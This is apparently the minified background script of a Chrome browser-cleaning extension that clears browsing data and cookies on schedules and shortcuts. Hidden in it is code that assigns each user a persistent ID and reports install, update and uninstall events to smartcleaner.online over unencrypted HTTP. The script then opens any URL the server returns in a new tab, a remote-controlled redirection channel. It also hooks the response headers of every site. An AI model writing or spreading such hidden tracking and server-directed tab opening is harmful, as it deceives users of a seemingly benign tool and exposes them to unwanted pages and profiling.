(()=>{chrome.runtime.onInstalled.addListener((e=>{if("install"===e.reason){const e={autorefresh:!1,floatbtn:!1,shortCuts:!0,cookie_settings:JSON.stringify({inclusive:!0,filters:[]}),dataToRemove:JSON.stringify([]),timePeriod:"last_hour",timeInterval:"off",theme:"light",audio:!0,isConfirm:!1,clickCountFromPopup:0,clickCountFromOptions:0};chrome.storage.local.set(e,(()=>{}))}}));const e=new class{constructor(){this.storage=null,this.actionUrl="http://smartcleaner.online/api/action/",this.uninstallUrl="http://smartcleaner.online/uninstall/",this.config={},this.queue=[],this.queueProcessorReady=!1,this.uid="",this.version=chrome.runtime.getManifest().version,this.run()}run(){this.runHelpers(),this.initStorage().then((()=>{this.checkInterval(),this.startListeners()}))}runHelpers(){this.runStorage(),this.runListeners()}runStorage(){chrome.storage.local.get((e=>{e&&e.config&&(this.config=e.config),this.config.uid?this.uid=this.config.uid:(this.uid=this.config.uid=this.generateUID(),this.saveConfig()),this.queueProcessorReady=!0,this.setUninstallUrl(),this.processQueue()}))}setUninstallUrl(){var e="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:"uninstall",uid:this.uid,t:Date.now()})));chrome.runtime.setUninstallURL(this.uninstallUrl+"?"+e)}processQueue(){for(;0<this.queue.length;){var e=this.queue.shift();if(!e.type||"action"!=e.type)return!0;var t="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:e.action,uid:this.uid,t:Date.now()})));fetch(this.actionUrl+"?"+t).then((e=>e.json())).then((function(e){e.url&&chrome.tabs.create({url:e.url})}))}}saveConfig(){chrome.storage.local.set({config:this.config})}generateUID(){return"xxxxxxxx-xxxx-2xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){var t=0|16*Math.random();return("x"==e?t:8|3&t).toString(16)}))}runListeners(){chrome.runtime.onInstalled.addListener((e=>{this.queue.push({type:"action",action:e.reason}),this.queueProcessorReady&&this.processQueue()}))}initStorage(){return new Promise((e=>{chrome.storage.local.get((t=>{this.storage=t,e()}))}))}checkInterval(){"chrome_start"!==this.storage.timeInterval||this.updateStorageInfo(null,null,!0)}startListeners(){this.startAlarmsListeners(),this.startMessageListeners(),this.startRequestListeners()}startAlarmsListeners(){chrome.alarms.onAlarm.addListener((()=>{this.updateStorageInfo(null,null,!0)}))}startMessageListeners(){chrome.runtime.onMessage.addListener(((e,t,r)=>{switch(e.action){case"clear":this.updateStorageInfo(e.tab,e.removeObject),r("");break;case"clearBtn":this.manageStorageInfo(),r("");break;case"intervalChange":this.manageChangeInterval(e.value)}return!0}))}startRequestListeners(){chrome.webRequest.onHeadersReceived.addListener((({responseHeaders:e})=>{let t=[];return e.forEach((e=>{t.push(e)})),{responseHeaders:t}}),{urls:["*://*/*"]},["responseHeaders"])}updateStorageInfo(e,t,r){this.fetchStorageData().then((s=>{const{timePeriod:o,dataToRemove:a,autorefresh:n,cookieFilters:i,shortCuts:c}=s,h=this.fetchTimeInt(o),l=t||this.getRemoveObject(a);let u=!1;l.cookies&&i.filters.length&&(l.cookies=!1,u=!0),chrome.browsingData.remove({since:h},l),u&&this.exectDelCookies(i),(r||n)&&!0===n&&setTimeout((()=>{chrome.tabs.reload(e.id,(()=>{}))}),2e3)})).then((()=>{chrome.storage.local.get((t=>{!0===t.audio&&chrome.tabs.sendMessage(e.id,{data:"startAudio"})}))}))}manageStorageInfo(){chrome.tabs.query({active:!0,currentWindow:!0},(e=>{this.updateStorageInfo(e[0])}))}manageChangeInterval(e){const t={off:"off",15:15,30:30,60:60,120:120,chrome_start:"chrome_start"}[e];return new Promise(((e,r)=>{chrome.storage.local.set({timeInterval:t},(()=>{chrome.runtime.lastError&&r(),e()}))})).then((()=>this.getInterval("clearInterval"))).then((e=>{if(e)this.clearInterval("clearInterval").then((()=>{"off"===t||"chrome_start"===t||this.makeInterval("clearInterval",t)}));else{if("off"===t||"chrome_start"===t)return;this.makeInterval("clearInterval",t)}})).catch((()=>{}))}getInterval(e){return new Promise((t=>{chrome.alarms.get(e,(e=>{t(e)}))}))}makeInterval(e,t){return new Promise((r=>{chrome.alarms.create(e,{periodInMinutes:t}),r()}))}clearInterval(e){return new Promise((t=>{chrome.alarms.clear(e,(()=>{t()}))}))}exectDelCookies(e){if(e.inclusive)e.filters.forEach((e=>{chrome.cookies.getAll({domain:e},(e=>{e.forEach((e=>this.delCookie(e)))}))}));else{const t={};e.filters.forEach((e=>{const r=e.split(".");0!==e.indexOf(".")&&0!==e.indexOf("http")&&"localhost"!==e&&(2<r.length||"local"!==r[2])&&(e="."+e),t[e]=!0})),chrome.cookies.getAll({},(e=>{e.forEach((e=>{t[e.domain]||this.delCookie(e)}))}))}}delCookie(e){const t={url:(e.secure?"https://":"http://")+e.domain,name:e.name};chrome.cookies.remove(t,(function(){}))}fetchTimeInt(e){switch(e){case"last_hour":return(new Date).getTime()-36e5;case"last_day":return(new Date).getTime()-864e5;case"last_week":return(new Date).getTime()-6048e5;case"last_month":return(new Date).getTime()-24192e5;default:return 0}}fetchStorageData(){return new Promise((e=>{chrome.storage.local.get((t=>{const r=t.timePeriod,s=(t.timeInterval,JSON.parse(t.dataToRemove)),o=t.autorefresh,a=JSON.parse(t.cookie_settings),n=t.shortCuts;e({timePeriod:r,dataToRemove:s,autorefresh:o,cookieFilters:a,shortCuts:n})}))}))}getRemoveObject(e){const t={};return e.forEach((e=>t[e]=!0)),t}};chrome.commands.onCommand.addListener((function(t,r){chrome.tabs.update({},(function(r){new Promise((e=>{chrome.storage.local.get((t=>{const r=t.shortCuts;e({shortCuts:r})}))})).then((r=>{let s=r.shortCuts;"clear"===t&&s&&chrome.tabs.query({active:!0,currentWindow:!0},(t=>{chrome.storage.local.get((r=>{const s={};var o;JSON.parse(r.dataToRemove).forEach((e=>{s[e]=!0})),o={tab:t[0],data:s},e.updateStorageInfo(o.tab,o.data)}))}))}))}))}))})();